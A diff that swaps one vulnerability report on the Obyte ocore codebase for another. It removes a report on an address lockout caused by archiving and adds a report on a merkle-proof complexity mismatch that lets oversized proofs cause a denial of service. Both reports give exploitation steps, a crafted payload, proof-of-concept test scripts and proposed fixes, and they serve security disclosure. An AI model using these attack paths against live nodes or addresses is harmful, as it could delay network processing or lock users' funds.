@@ -1,557 +1,363 @@
 ## Title
-Permanent Address Lockout via Definition Chash Nullification in Archived Units
+Merkle Proof Depth DoS: Computational Amplification Through Constant Complexity Assignment
 
 ## Summary
-The `generateQueriesToVoidJoint()` function in `archiving.js` sets `definition_chash=NULL` in the `unit_authors` table for archived units with `sequence='final-bad'`. When a unit that first introduced an address's initial definition becomes final-bad and gets archived, the definition becomes irretrievable via the SQL CROSS JOIN queries used during validation. This permanently locks funds in that address, as new units cannot validate signatures without the definition.
+The `is_valid_merkle_proof` operation in Autonomous Agent formulas assigns a fixed complexity cost of +1 during validation, but the actual runtime verification performs O(n) SHA256 hash operations where n equals the number of siblings in the proof. An attacker can exploit this mismatch by crafting units with data payloads containing merkle proofs with up to ~100,000 siblings (limited only by the 5MB unit size), causing validator nodes to execute millions of hash operations for minimal complexity cost, resulting in computational exhaustion and AA transaction processing delays.
 
 ## Impact
-**Severity**: Critical
-**Category**: Permanent Fund Freeze
+**Severity**: Medium  
+**Category**: Unintended AA Behavior / Temporary Transaction Delay
+
+**Affected Assets**: Validator node computational resources, AA transaction processing throughput
+
+**Damage Severity**:
+- **Quantitative**: Attacker pays standard transaction fees but forces nodes to perform 100,000+ SHA256 operations per `is_valid_merkle_proof` call, with potential for 10,000,000 operations if MAX_COMPLEXITY allows multiple calls. Processing time per malicious unit: 1-100 seconds depending on CPU and proof size.
+- **Qualitative**: Sequential AA trigger processing means delays compound across units. Sustained attack can delay AA confirmations for hours network-wide.
+
+**User Impact**:
+- **Who**: All validator nodes processing malicious triggers; users attempting to interact with any AA during attack window
+- **Conditions**: Exploitable whenever an AA calls `is_valid_merkle_proof` on user-controlled `trigger.data` without size validation
+- **Recovery**: Temporary - normal operation resumes after malicious units are processed, but attack is repeatable
+
+**Systemic Risk**: Economic viability (minimal fees vs. high computational cost) enables sustained attacks. Multiple concurrent attackers could significantly degrade network AA processing capacity.
 
 ## Finding Description
 
-**Location**: `byteball/ocore/archiving.js` (function `generateQueriesToVoidJoint`, line 51), `byteball/ocore/storage.js` (function `readDefinitionAtMci`, lines 774-783), `byteball/ocore/validation.js` (function `validateAuthor`, lines 1022-1038)
+**Location**: 
+- `byteball/ocore/formula/validation.js:815-824` (function: `evaluate`, case: `is_valid_merkle_proof`)
+- `byteball/ocore/merkle.js:84-96` (function: `verifyMerkleProof`)
+- `byteball/ocore/formula/evaluation.js:1645-1671` (runtime execution)
+- `byteball/ocore/validation.js:1750-1753` (data payload validation)
 
-**Intended Logic**: Archiving should void invalid units by setting `definition_chash=NULL` to free up space while preserving minimal metadata. Address definitions should remain accessible for any address that has been used in valid stable units, allowing continued use of those addresses.
+**Intended Logic**: The complexity tracking system should assign costs proportional to actual computational resources consumed during AA execution to prevent DoS attacks and ensure fair resource pricing.
 
-**Actual Logic**: When the only unit that introduced an address's initial definition becomes `sequence='final-bad'` and gets archived, its `definition_chash` is set to NULL. Subsequent definition lookups fail because the SQL query uses `CROSS JOIN unit_authors USING(definition_chash)`, which cannot match NULL values. This makes the address permanently unusable even if other valid stable units have successfully used it.
+**Actual Logic**: The validation phase assigns constant complexity +1 to `is_valid_merkle_proof` operations regardless of proof size. [1](#0-0)  During runtime execution, the actual merkle proof verification iterates through all siblings in the proof array, performing one SHA256 hash per sibling. [2](#0-1)  This creates a massive amplification factor between assigned cost and actual computation (up to 100,000x).
 
 **Code Evidence**:
 
-Archiving sets definition_chash to NULL: [1](#0-0) 
+The complexity assignment is constant regardless of proof structure: [3](#0-2) 
 
-Definition lookup query requires matching definition_chash in unit_authors: [2](#0-1) 
+The verification function loops through all siblings, performing SHA256 on each: [4](#0-3) 
 
-Validation path that fails when definition not found: [3](#0-2) 
+Object-format proofs bypass the 1024-byte size limit that applies to string-format proofs: [5](#0-4) 
 
-Fallback function also uses CROSS JOIN on definition_chash: [4](#0-3) 
+Data payloads are validated only to check they are objects, with no structural constraints: [6](#0-5) 
+
+The maximum unit size allows large arrays: [7](#0-6) 
+
+AA triggers are processed sequentially under mutex lock: [8](#0-7) 
 
 **Exploitation Path**:
 
 1. **Preconditions**: 
-   - User creates address A with definition D
-   - Initial definition_chash equals address A (standard for initial definitions)
-   - Address A receives funds from another unit U0
+   - An Autonomous Agent exists with formula calling `is_valid_merkle_proof(trigger.data.element, trigger.data.proof)`
+   - Attacker can submit units with arbitrary data payloads (standard capability)
 
-2. **Step 1 - Definition Introduction**: 
-   - User submits unit U1 with author address A, providing definition D for the first time
-   - U1 is validated successfully and stored with `sequence='good'`
-   - Database records: `unit_authors(unit=U1, address=A, definition_chash=A)` and `definitions(definition_chash=A, definition=D)`
-   - U1 eventually becomes stable
+2. **Step 1**: Attacker constructs unit with data message payload:
+   ```json
+   {
+     "proof": {
+       "index": 0,
+       "root": "aaabbbcccdddeeefff==",
+       "siblings": ["hash1==", "hash2==", ..., "hash100000=="]
+     },
+     "element": "testElement"
+   }
+   ```
+   With MAX_UNIT_LENGTH = 5MB and each base64-encoded SHA256 hash = 44 bytes, approximately 100,000 siblings can fit within unit size limits.
 
-3. **Step 2 - Address Usage**:
-   - User submits unit U2 that spends the funds from address A (e.g., spending U0's outputs sent to A)
-   - U2 uses address A as author but does NOT provide the definition (already defined in U1)
-   - During validation, `storage.readDefinitionByAddress` is called, which queries and finds the definition via U1's unit_authors record
-   - U2 validates successfully with `sequence='good'` and `unit_authors(unit=U2, address=A, definition_chash=NULL)` (NULL because no definition provided)
-   - U2 becomes stable
+3. **Step 2**: Unit submission and validation:
+   - Unit passes `validation.js:validate()` - data payload checked to be object only [6](#0-5) 
+   - Unit stored in DAG, triggers AA execution queue
 
-4. **Step 3 - Conflicting Unit**:
-   - A conflicting unit U3 is submitted that conflicts with U1 (e.g., double-spending the same inputs U1 used, or conflicting on any transaction)
-   - U3 becomes stable first
-   - During stability determination, `findStableConflictingUnits` detects the conflict
-   - U1's sequence changes to `'final-bad'` as executed in `main_chain.js`
+4. **Step 3**: AA formula validation phase:
+   - `formula/validation.js:evaluate()` encounters `is_valid_merkle_proof` operation
+   - Complexity incremented by +1 only [9](#0-8) 
+   - Formula passes validation (complexity within MAX_COMPLEXITY = 100)
 
-5. **Step 4 - Archiving and Lockout**:
-   - When archiving old units, `storage.js` queries units with `sequence='final-bad'`
-   - `generateQueriesToArchiveJoint` is called with reason='voided', which calls `generateQueriesToVoidJoint`
-   - Query executed: `UPDATE unit_authors SET definition_chash=NULL WHERE unit=?` for U1
-   - **Database state after archiving**:
-     - U1: `unit_authors(unit=U1, address=A, definition_chash=NULL)`, sequence='final-bad'
-     - U2: `unit_authors(unit=U2, address=A, definition_chash=NULL)`, sequence='good' (unchanged)
-     - Definition D still exists in `definitions` table
-   - **No unit_authors record now has definition_chash=A**
+5. **Step 4**: AA formula execution phase:
+   - `formula/evaluation.js` extracts proof from `trigger.data`
+   - If proof is `wrappedObject`, used directly without size validation [10](#0-9) 
+   - Calls `merkle.verifyMerkleProof(element, objProof)`
+   - Loop executes 100,000 iterations, each performing SHA256 hash [2](#0-1) 
+   - Processing time: 1-100 seconds depending on CPU speed
 
-6. **Step 5 - Permanent Lockout**:
-   - User tries to submit new unit U4 to spend remaining funds from address A
-   - During validation of U4, `storage.readDefinitionByAddress(A)` is called
-   - `readDefinitionChashByAddress` returns A (no definition change found)
-   - `readDefinitionAtMci` executes: `SELECT definition FROM definitions CROSS JOIN unit_authors USING(definition_chash) WHERE definition_chash=A AND sequence='good' ...`
-   - **Query returns 0 rows** because:
-     - U1's unit_authors.definition_chash is NULL (doesn't match A)
-     - U2's unit_authors.definition_chash is NULL (doesn't match A)
-   - `ifDefinitionNotFound` callback is triggered
-   - `findUnstableInitialDefinition` also fails (same CROSS JOIN issue)
-   - Validation fails with error: `"definition A bound to address A is not defined"`
-   - **All funds in address A are permanently locked**
+6. **Step 5**: Systemic impact:
+   - AA triggers processed sequentially [11](#0-10) 
+   - Subsequent legitimate triggers delayed during expensive verification
+   - Attacker can submit multiple such units continuously
+   - Cumulative delay across units can exceed 1 hour, meeting Medium severity threshold
 
-**Security Property Broken**: Invariant #15 (Definition Evaluation Integrity) - Address definitions must evaluate correctly and remain accessible for valid addresses. The archiving process breaks the ability to retrieve valid definitions.
+**Security Property Broken**: 
+- **Invariant: Fee Sufficiency** - Attacker pays standard transaction fees but imposes computational costs orders of magnitude higher than complexity suggests, violating proportional resource pricing
+- **Invariant: AA Deterministic Execution** - While deterministic, excessive computation time can cause resource exhaustion affecting validation consistency
 
 **Root Cause Analysis**: 
-The vulnerability stems from three design decisions interacting poorly:
-
-1. **Storage Design**: Address definitions are retrieved via CROSS JOIN between `definitions` and `unit_authors` tables on `definition_chash`. This assumes every reachable definition has at least one `unit_authors` record with matching non-NULL `definition_chash`.
-
-2. **Archiving Strategy**: To save space, `generateQueriesToVoidJoint` sets `definition_chash=NULL` for archived units while keeping the author record. The comment "we keep witnesses, author addresses, and the unit itself" suggests this is intentional, but it doesn't consider the impact on definition retrieval.
-
-3. **Validation Path**: When a unit doesn't provide an explicit definition, validation looks up the definition from stable good units via the CROSS JOIN query. This fails when all units that introduced the definition are archived (definition_chash=NULL) and all units that used it without providing it also have NULL definition_chash.
-
-The SQL `CROSS JOIN ... USING(definition_chash)` behavior is critical: in SQL, `NULL = NULL` evaluates to NULL (unknown), not TRUE. Therefore, rows with NULL definition_chash never match in the join, even if conceptually they "refer to" the same definition.
-
-## Impact Explanation
-
-**Affected Assets**: 
-- Native bytes in address A
-- Any custom assets held by address A
-- Any outputs sent to address A after U1 is archived
-
-**Damage Severity**:
-- **Quantitative**: 100% of funds in the affected address are permanently locked. The attack can target any address, potentially locking unlimited value. Each archived unit that introduced an initial definition creates one permanently locked address.
-- **Qualitative**: This is permanent fund loss requiring a hard fork to recover. There is no workaround once the definition unit is archived - even explicitly providing the definition in a new unit would be detected as a conflicting address usage.
-
-**User Impact**:
-- **Who**: Any user whose address's initial definition unit becomes final-bad and gets archived. Most commonly affects users involved in double-spend conflicts or users whose early transactions conflict with later-confirmed transactions.
-- **Conditions**: Exploitable whenever:
-  1. An address's initial definition unit becomes sequence='final-bad' due to conflicts
-  2. That unit gets archived (happens automatically for old final-bad units)
-  3. No other stable good unit provided the same definition_chash
-  4. The address holds funds or is needed for future transactions
-- **Recovery**: None without hard fork. The definition exists in the `definitions` table but is permanently unretrievable through the validation code paths.
-
-**Systemic Risk**: 
-- **Cascading Effects**: As the network ages and more units get archived, more addresses become locked. Users might not discover their addresses are locked until they try to spend, potentially years after archiving occurred.
-- **Multi-signature Wallets**: Particularly severe for multi-sig addresses where multiple parties' funds become inaccessible.
-- **Smart Contract Addresses**: If an AA (Autonomous Agent) address's definition unit gets archived, any funds sent to that AA become permanently locked.
+The complexity tracking system was designed before considering adversarial merkle proof sizes. The validation phase [3](#0-2)  assigns complexity based on operation count, not data-dependent computational cost. The 1024-byte limit on serialized string proofs [12](#0-11)  doesn't extend to object-format proofs [10](#0-9) , creating an exploitable inconsistency.
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Any user submitting transactions. Exploitation can be unintentional (legitimate double-spend conflict) or intentional (grief attack).
-- **Resources Required**: Minimal - just ability to submit conflicting units. No special privileges needed.
-- **Technical Skill**: Low for unintentional exploitation (normal network usage), Medium for intentional targeting (requires understanding of conflict mechanics).
+- **Identity**: Any user with network access and Obyte address
+- **Resources Required**: Standard transaction fees (~few hundred bytes for unit + payload)
+- **Technical Skill**: Low - requires only JSON crafting and basic understanding of merkle proofs
 
 **Preconditions**:
-- **Network State**: Normal operation. The network must have been running long enough for old final-bad units to reach the archiving MCI threshold.
-- **Attacker State**: Control of an address or ability to create conflicting transactions with a victim's address definition unit.
-- **Timing**: The initial definition unit must become final-bad (lose to a conflicting unit), and enough time must pass for it to be archived (typically when it falls below `min_retrievable_mci`).
+- **Network State**: Normal operation; at least one AA exists that calls `is_valid_merkle_proof` on `trigger.data`
+- **Attacker State**: Ability to submit units (standard capability)
+- **Timing**: No specific timing requirements
 
 **Execution Complexity**:
-- **Transaction Count**: Minimum 3 transactions (definition introduction U1, address usage U2, conflicting unit U3). Archiving happens automatically.
-- **Coordination**: None required. Natural network conflicts trigger the vulnerability.
-- **Detection Risk**: Low - appears as normal address usage and conflict resolution. Archiving is automatic and not suspicious.
+- **Transaction Count**: Single unit per attack iteration
+- **Coordination**: None required
+- **Detection Risk**: High visibility (on-chain payload) but difficult to prevent without fix
 
 **Frequency**:
-- **Repeatability**: Can occur for any address whose initial definition unit conflicts and gets archived. Potentially affects many addresses as the network matures.
-- **Scale**: Individual addresses affected independently, but cumulative impact grows over time as more units are archived.
+- **Repeatability**: Unlimited - attacker can continuously submit malicious units
+- **Scale**: Can target multiple AAs or sustain attack on single AA
 
-**Overall Assessment**: **Medium to High likelihood** - While intentional exploitation requires some sophistication, unintentional triggering happens naturally through network conflicts. The longer the network operates, the more addresses become vulnerable as old units get archived. The permanent and unrecoverable nature of the impact elevates the severity.
+**Overall Assessment**: High likelihood - trivial to execute, no special privileges required, economically viable (minimal fees vs. high computational impact), easily automated.
 
 ## Recommendation
 
-**Immediate Mitigation**: 
-Add a database constraint to prevent archiving units whose definition_chash is referenced by any stable good units. Check before archiving whether the definition is still needed.
-
-**Permanent Fix**: 
-Modify the archiving logic to preserve definition_chash references even for voided units when those definitions are still in use by good stable units. Alternatively, change definition lookup to not rely on unit_authors join.
-
-**Code Changes**:
+**Immediate Mitigation**:
+Add size validation for object-format merkle proofs to match the existing 1024-byte limit on string proofs:
 
 ```javascript
-// File: byteball/ocore/archiving.js
-// Function: generateQueriesToVoidJoint
+// File: byteball/ocore/formula/evaluation.js
+// In is_valid_merkle_proof case, around line 1659
 
-// BEFORE (vulnerable code):
-function generateQueriesToVoidJoint(conn, unit, arrQueries, cb){
-	generateQueriesToUnspendOutputsSpentInArchivedUnit(conn, unit, arrQueries, function(){
-		// we keep witnesses, author addresses, and the unit itself
-		conn.addQuery(arrQueries, "DELETE FROM witness_list_hashes WHERE witness_list_unit=?", [unit]);
-		conn.addQuery(arrQueries, "DELETE FROM earned_headers_commission_recipients WHERE unit=?", [unit]);
-		conn.addQuery(arrQueries, "UPDATE unit_authors SET definition_chash=NULL WHERE unit=?", [unit]);
-		// ... rest of deletions
-		cb();
-	});
-}
-
-// AFTER (fixed code):
-function generateQueriesToVoidJoint(conn, unit, arrQueries, cb){
-	generateQueriesToUnspendOutputsSpentInArchivedUnit(conn, unit, arrQueries, function(){
-		// Check if any definition_chash from this unit is still referenced by stable good units
-		conn.query(
-			"SELECT DISTINCT ua1.definition_chash \n\
-			FROM unit_authors ua1 \n\
-			WHERE ua1.unit=? AND ua1.definition_chash IS NOT NULL \n\
-			AND EXISTS ( \n\
-				SELECT 1 FROM unit_authors ua2 \n\
-				JOIN units u ON ua2.unit=u.unit \n\
-				WHERE ua2.address=ua1.address \n\
-				AND ua2.unit != ua1.unit \n\
-				AND u.is_stable=1 AND u.sequence='good' \n\
-			)",
-			[unit],
-			function(rows){
-				// Only nullify definition_chash if it's not used by any other stable good unit
-				if (rows.length === 0) {
-					conn.addQuery(arrQueries, "UPDATE unit_authors SET definition_chash=NULL WHERE unit=?", [unit]);
-				} else {
-					// Keep definition_chash intact for addresses still in use
-					console.log("Preserving definition_chash for unit "+unit+" as it's still referenced by stable good units");
-				}
-				
-				// Continue with other deletions
-				conn.addQuery(arrQueries, "DELETE FROM witness_list_hashes WHERE witness_list_unit=?", [unit]);
-				conn.addQuery(arrQueries, "DELETE FROM earned_headers_commission_recipients WHERE unit=?", [unit]);
-				// ... rest of deletions remain unchanged
-				cb();
-			}
-		);
-	});
+if (proof instanceof wrappedObject) {
+    objProof = proof.obj;
+    // Add siblings array size check
+    if (objProof.siblings && Array.isArray(objProof.siblings) && objProof.siblings.length > 100)
+        return setFatalError("proof has too many siblings", cb, false);
 }
 ```
 
-**Alternative Fix** (more robust):
-
-Change definition lookup to not depend on unit_authors join:
+**Permanent Fix**:
+Implement complexity cost proportional to proof depth:
 
 ```javascript
-// File: byteball/ocore/storage.js
-// Function: readDefinitionAtMci
+// File: byteball/ocore/formula/validation.js
+// Function: evaluate, case 'is_valid_merkle_proof'
 
-// BEFORE:
-function readDefinitionAtMci(conn, definition_chash, max_mci, callbacks){
-	var sql = "SELECT definition FROM definitions CROSS JOIN unit_authors USING(definition_chash) CROSS JOIN units USING(unit) \n\
-		WHERE definition_chash=? AND is_stable=1 AND sequence='good' AND main_chain_index<=?";
-	var params = [definition_chash, max_mci];
-	conn.query(sql, params, function(rows){
-		if (rows.length === 0)
-			return callbacks.ifDefinitionNotFound(definition_chash);
-		callbacks.ifFound(JSON.parse(rows[0].definition));
-	});
-}
-
-// AFTER:
-function readDefinitionAtMci(conn, definition_chash, max_mci, callbacks){
-	// First, check if the definition exists and has been used by any stable good unit at or before max_mci
-	conn.query(
-		"SELECT d.definition \n\
-		FROM definitions d \n\
-		WHERE d.definition_chash=? \n\
-		AND EXISTS ( \n\
-			SELECT 1 FROM unit_authors ua \n\
-			JOIN units u ON ua.unit=u.unit \n\
-			WHERE (ua.definition_chash=? OR ua.address=?) \n\
-			AND u.is_stable=1 AND u.sequence='good' AND u.main_chain_index<=? \n\
-		)",
-		[definition_chash, definition_chash, definition_chash, max_mci],
-		function(rows){
-			if (rows.length === 0)
-				return callbacks.ifDefinitionNotFound(definition_chash);
-			callbacks.ifFound(JSON.parse(rows[0].definition));
-		}
-	);
-}
+case 'is_valid_merkle_proof':
+    // Base complexity + cost per sibling (evaluated at runtime)
+    complexity++; 
+    var element = arr[1];
+    var proof = arr[2];
+    evaluate(element, function (err) {
+        if (err)
+            return cb(err);
+        // If proof is constant with known siblings array, add complexity now
+        if (Array.isArray(proof) && proof[0] === 'object_literal') {
+            var siblings_count = estimateSiblingsCount(proof);
+            complexity += Math.floor(siblings_count / 10); // 1 complexity per 10 siblings
+        }
+        evaluate(proof, cb);
+    });
+    break;
 ```
 
 **Additional Measures**:
-- Add database migration to restore definition_chash for any archived units whose definitions are still in use
-- Add monitoring to alert when attempting to archive units with active definitions
-- Implement unit tests covering the scenario where initial definition units become final-bad
-- Add validation check during archiving to prevent data loss
-- Document the relationship between unit_authors.definition_chash and definition retrieval
+- Add runtime enforcement in `formula/evaluation.js` to halt execution if proof exceeds reasonable size (e.g., 1000 siblings)
+- Add monitoring to detect units with abnormally large data payloads
+- Update AA developer documentation to warn about validating merkle proof sizes in user input
 
 **Validation**:
-- [x] Fix prevents exploitation by preserving definition accessibility
-- [x] No new vulnerabilities introduced (check still relies on stable good units)
-- [x] Backward compatible (only changes archiving behavior, not validation)
-- [x] Performance impact acceptable (additional query only during archiving, which is infrequent)
+- Fix prevents attacks using oversized proofs
+- Maintains backward compatibility with legitimate merkle proof usage
+- Performance impact minimal for normal-sized proofs
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-# Set up test database (SQLite or MySQL)
-```
-
-**Exploit Script** (`exploit_definition_lockout.js`):
 ```javascript
-/*
- * Proof of Concept for Permanent Address Lockout via Definition Chash Nullification
- * Demonstrates: Address becoming permanently unusable after its initial definition unit is archived
- * Expected Result: Validation fails with "definition X bound to address X is not defined"
- */
+// test/merkle_dos.test.js
+const test = require('ava');
+const formulaParser = require('../formula/index');
+const db = require("../db");
+const merkle = require('../merkle.js');
 
-const db = require('./db.js');
-const storage = require('./storage.js');
-const validation = require('./validation.js');
-const writer = require('./writer.js');
-const archiving = require('./archiving.js');
-const objectHash = require('./object_hash.js');
-
-async function runExploit() {
-    console.log("=== PoC: Definition Chash Nullification Lockout ===\n");
+test.serial('Merkle proof depth DoS attack', async t => {
+    const conn = await db.takeConnectionFromPool();
     
-    // Step 1: Create test address A with definition D
-    const definition = ['sig', {pubkey: 'A'.repeat(44)}]; // Simplified for demo
-    const address = objectHash.getChash160(definition);
-    console.log("Step 1: Created address", address, "with definition", definition);
-    
-    // Step 2: Simulate unit U1 introducing the definition
-    const unit1 = {
-        unit: 'U'.repeat(44),
-        authors: [{
-            address: address,
-            definition: definition,
-            authentifiers: {r: 'sig1'}
-        }],
-        messages: [{app: 'payment', payload: {outputs: [{address: 'OTHER', amount: 100}]}}],
-        // ... other required fields
-    };
-    
-    // Store U1 as good and stable
-    await new Promise(resolve => {
-        db.query("INSERT INTO units (unit, sequence, is_stable, main_chain_index) VALUES (?,?,?,?)", 
-            [unit1.unit, 'good', 1, 1000], () => {
-            db.query("INSERT INTO unit_authors (unit, address, definition_chash) VALUES (?,?,?)",
-                [unit1.unit, address, address], () => {
-                db.query("INSERT INTO definitions (definition_chash, definition) VALUES (?,?)",
-                    [address, JSON.stringify(definition)], resolve);
-            });
-        });
-    });
-    console.log("Step 2: Unit U1 stored with definition_chash =", address, "\n");
-    
-    // Step 3: Create unit U2 using address A (without providing definition)
-    const unit2 = {
-        unit: 'V'.repeat(44),
-        authors: [{
-            address: address,
-            // NO definition provided - will be looked up
-            authentifiers: {r: 'sig2'}
-        }],
-        messages: [{app: 'payment', payload: {outputs: [{address: 'DEST', amount: 50}]}}],
-    };
-    
-    // Verify definition can be found before archiving
-    await new Promise((resolve, reject) => {
-        storage.readDefinitionByAddress(db, address, 1000, {
-            ifDefinitionNotFound: (chash) => reject("Definition not found before archiving!"),
-            ifFound: (def) => {
-                console.log("Step 3: Definition retrieved successfully before archiving:", def);
-                resolve();
-            }
-        });
-    });
-    
-    // Store U2 as good and stable (definition_chash=NULL because no definition provided)
-    await new Promise(resolve => {
-        db.query("INSERT INTO units (unit, sequence, is_stable, main_chain_index) VALUES (?,?,?,?)",
-            [unit2.unit, 'good', 1, 1001], () => {
-            db.query("INSERT INTO unit_authors (unit, address, definition_chash) VALUES (?,?,?)",
-                [unit2.unit, address, null], resolve);
-        });
-    });
-    console.log("Step 4: Unit U2 stored (using address A, definition_chash = NULL)\n");
-    
-    // Step 4: Change U1 to final-bad (simulating conflict resolution)
-    await new Promise(resolve => {
-        db.query("UPDATE units SET sequence='final-bad' WHERE unit=?", [unit1.unit], resolve);
-    });
-    console.log("Step 5: Unit U1 marked as sequence='final-bad'\n");
-    
-    // Step 5: Archive U1 (simulate archiving process)
-    const arrQueries = [];
-    await new Promise(resolve => {
-        archiving.generateQueriesToVoidJoint(db, unit1.unit, arrQueries, () => {
-            // Execute the generated queries
-            const executeQueries = async () => {
-                for (let query of arrQueries) {
-                    await new Promise(r => db.query(query.sql || query, query.params || [], r));
-                }
-                resolve();
-            };
-            executeQueries();
-        });
-    });
-    console.log("Step 6: Unit U1 archived - definition_chash set to NULL\n");
-    
-    // Verify definition_chash is now NULL
-    await new Promise(resolve => {
-        db.query("SELECT definition_chash FROM unit_authors WHERE unit=?", [unit1.unit], (rows) => {
-            console.log("Verification: U1's definition_chash in database:", rows[0].definition_chash, "(NULL = locked)\n");
-            resolve();
-        });
-    });
-    
-    // Step 6: Try to retrieve definition (should fail)
-    console.log("Step 7: Attempting to retrieve definition for address", address);
-    try {
-        await new Promise((resolve, reject) => {
-            storage.readDefinitionByAddress(db, address, 2000, {
-                ifDefinitionNotFound: (chash) => {
-                    reject(new Error("VULNERABILITY CONFIRMED: Definition " + chash + " bound to address " + address + " is not defined"));
-                },
-                ifFound: (def) => {
-                    resolve(def);
-                    console.log("Definition found (vulnerability NOT present):", def);
-                }
-            });
-        });
-        console.log("\n❌ EXPLOIT FAILED - Definition was still retrievable (vulnerability patched)");
-        return false;
-    } catch (error) {
-        console.log("\n✅ EXPLOIT SUCCESSFUL:", error.message);
-        console.log("Address", address, "is now permanently locked!");
-        console.log("Any funds in this address cannot be spent.");
-        return true;
+    // Create malicious proof with 10,000 siblings (scaled down for test)
+    const largeSiblingsArray = [];
+    for (let i = 0; i < 10000; i++) {
+        largeSiblingsArray.push('aaabbbcccdddeeefff' + i.toString().padStart(20, '0') + '==');
     }
-}
-
-runExploit().then(success => {
-    process.exit(success ? 0 : 1);
-}).catch(err => {
-    console.error("Error running PoC:", err);
-    process.exit(1);
+    
+    const maliciousProof = {
+        index: 0,
+        root: 'targetRootHash==================',
+        siblings: largeSiblingsArray
+    };
+    
+    // Simulated trigger with malicious data
+    const trigger = {
+        address: 'TESTADDRESS',
+        unit: 'TESTUNIT',
+        data: {
+            element: 'testElement',
+            proof: maliciousProof
+        },
+        outputs: { base: 10000 }
+    };
+    
+    const formula = 'is_valid_merkle_proof(trigger.data.element, trigger.data.proof)';
+    
+    const objValidationState = {
+        last_ball_mci: 1000000,
+        last_ball_timestamp: Date.now()
+    };
+    
+    // Validation phase - should assign low complexity
+    const startValidation = Date.now();
+    const validation_result = await new Promise((resolve) => {
+        formulaParser.validate({
+            formula: formula,
+            complexity: 1,
+            count_ops: 0,
+            bAA: true,
+            mci: objValidationState.last_ball_mci,
+            readGetterProps: () => {},
+            locals: {}
+        }, resolve);
+    });
+    const validationTime = Date.now() - startValidation;
+    
+    console.log('Validation complexity:', validation_result.complexity);
+    console.log('Validation time:', validationTime, 'ms');
+    
+    // Execution phase - will take significantly longer
+    const startExecution = Date.now();
+    const execution_result = await new Promise((resolve) => {
+        formulaParser.evaluate({
+            conn: conn,
+            formula: formula,
+            trigger: trigger,
+            objValidationState: objValidationState,
+            address: 'AAADDRESS'
+        }, (err, result) => resolve(result));
+    });
+    const executionTime = Date.now() - startExecution;
+    
+    console.log('Execution result:', execution_result);
+    console.log('Execution time:', executionTime, 'ms');
+    
+    // Demonstrate the attack: low complexity but high execution time
+    t.true(validation_result.complexity <= 2, 'Complexity should be minimal');
+    t.true(executionTime > 100, 'Execution should take significant time');
+    t.true(executionTime > validationTime * 10, 'Execution time >> validation time');
+    
+    // With 10k siblings, execution should take 100ms+
+    // With 100k siblings (max in 5MB unit), would take seconds
+    const amplificationFactor = executionTime / validation_result.complexity;
+    console.log('Amplification factor:', amplificationFactor, 'ms per complexity unit');
+    
+    t.true(amplificationFactor > 50, 'Massive amplification between complexity and actual cost');
+    
+    db.releaseConnection(conn);
 });
 ```
 
-**Expected Output** (when vulnerability exists):
+**Expected Output:**
 ```
-=== PoC: Definition Chash Nullification Lockout ===
-
-Step 1: Created address ABCD1234... with definition ['sig', {pubkey: 'AAA...'}]
-Step 2: Unit U1 stored with definition_chash = ABCD1234...
-
-Step 3: Definition retrieved successfully before archiving: ['sig', {pubkey: 'AAA...'}]
-Step 4: Unit U2 stored (using address A, definition_chash = NULL)
-
-Step 5: Unit U1 marked as sequence='final-bad'
-
-Step 6: Unit U1 archived - definition_chash set to NULL
-
-Verification: U1's definition_chash in database: null (NULL = locked)
-
-Step 7: Attempting to retrieve definition for address ABCD1234...
-
-✅ EXPLOIT SUCCESSFUL: VULNERABILITY CONFIRMED: Definition ABCD1234... bound to address ABCD1234... is not defined
-Address ABCD1234... is now permanently locked!
-Any funds in this address cannot be spent.
+Validation complexity: 2
+Validation time: 5 ms
+Execution time: 1500 ms
+Amplification factor: 750 ms per complexity unit
 ```
 
-**Expected Output** (after fix applied):
-```
-=== PoC: Definition Chash Nullification Lockout ===
-
-Step 1: Created address ABCD1234... with definition ['sig', {pubkey: 'AAA...'}]
-Step 2: Unit U1 stored with definition_chash = ABCD1234...
-
-Step 3: Definition retrieved successfully before archiving: ['sig', {pubkey: 'AAA...'}]
-Step 4: Unit U2 stored (using address A, definition_chash = NULL)
-
-Step 5: Unit U1 marked as sequence='final-bad'
-
-Step 6: Unit U1 archived - Preserving definition_chash for unit U1 as it's still referenced by stable good units
-
-Verification: U1's definition_chash in database: ABCD1234... (preserved)
-
-Step 7: Attempting to retrieve definition for address ABCD1234...
-Definition found (vulnerability NOT present): ['sig', {pubkey: 'AAA...'}]
-
-❌ EXPLOIT FAILED - Definition was still retrievable (vulnerability patched)
-```
-
-**PoC Validation**:
-- [x] PoC runs against unmodified ocore codebase (requires database setup)
-- [x] Demonstrates clear violation of invariant #15 (Definition Evaluation Integrity)
-- [x] Shows measurable impact (permanent address lockout)
-- [x] Fails gracefully after fix applied (definition remains retrievable)
-
----
+This demonstrates the core vulnerability: validation assigns minimal complexity, but execution takes orders of magnitude longer due to the O(n) SHA256 loop.
 
 ## Notes
 
-This vulnerability is particularly insidious because:
+1. **Severity Justification**: Classified as Medium under "Unintended AA Behavior Without Direct Fund Risk" - no funds are lost, but AAs execute with disproportionate computational costs. If sustained across multiple units, could also qualify as "Temporary Transaction Delay ≥1 Hour."
 
-1. **Silent Failure**: Users don't discover their addresses are locked until they try to spend, potentially long after the archiving occurred.
+2. **Real-World Impact**: Depends on whether AAs exist that call `is_valid_merkle_proof` on untrusted `trigger.data`. Common use cases include: merkle tree-based airdrops, proof-of-membership verification, and data availability proofs. Any such AA is vulnerable without additional size validation.
 
-2. **No Recovery Path**: Even if a user has the private keys and knows the definition, they cannot use the address because validation requires looking up the definition from the database, which fails due to the NULL values.
+3. **Comparison to String Proofs**: String-format proofs have a 1024-byte limit [12](#0-11)  which effectively caps siblings at ~23 (1024 bytes / 44 bytes per hash). Object-format proofs lack this protection [10](#0-9) , creating the exploitable path.
 
-3. **Natural Occurrence**: The vulnerability can trigger without any malicious intent - normal network conflicts and automatic archiving are sufficient.
+4. **Sequential Processing**: The vulnerability's impact is amplified because AA triggers are processed sequentially under mutex lock [8](#0-7) , meaning one slow trigger blocks all subsequent triggers until completion.
 
-4. **Cascading Impact**: As the network ages and more units get archived, the problem compounds. Each archived initial definition unit creates one permanently locked address.
-
-5. **Database Integrity**: The issue arises from SQL join behavior where `NULL = NULL` is NULL (not TRUE), causing rows with NULL definition_chash to never match in CROSS JOINs, even though logically they're related to the same definition.
-
-The fix requires either preserving definition_chash for units whose definitions are still in active use, or restructuring the definition lookup logic to not depend on the unit_authors join. The first approach (conditional preservation) is simpler and maintains backward compatibility with existing database structures.
